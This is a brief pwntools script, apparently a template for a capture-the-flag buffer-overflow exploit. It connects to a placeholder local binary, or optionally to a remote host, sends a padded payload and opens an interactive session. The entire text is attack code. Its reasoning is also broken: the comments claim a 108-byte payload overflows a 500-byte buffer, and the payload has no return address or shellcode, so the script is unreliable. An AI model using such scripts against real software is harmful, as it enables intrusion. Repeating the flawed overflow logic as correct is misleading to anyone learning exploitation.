from pwn import *
context.binary = './binary_name'  # Replace with the actual binary name

# Establish a process or network connection to the target binary
# Uncomment the appropriate line depending on whether you are running locally or remotely
target = process('./binary_name')  # For local testing
# target = remote('example.com', 1234)  # For remote exploitation

# Create a payload with a length that will overflow the passwd_buf
# The buffer is 500 bytes, but the check only allows up to 8 characters
# We will send exactly 8 characters plus some additional data to overflow
payload = b'A' * 8 + b'B' * 100  # Adjust the second multiplier as needed

# Send the crafted payload
target.sendline(payload)

# Interact with the process if necessary
target.interactive()
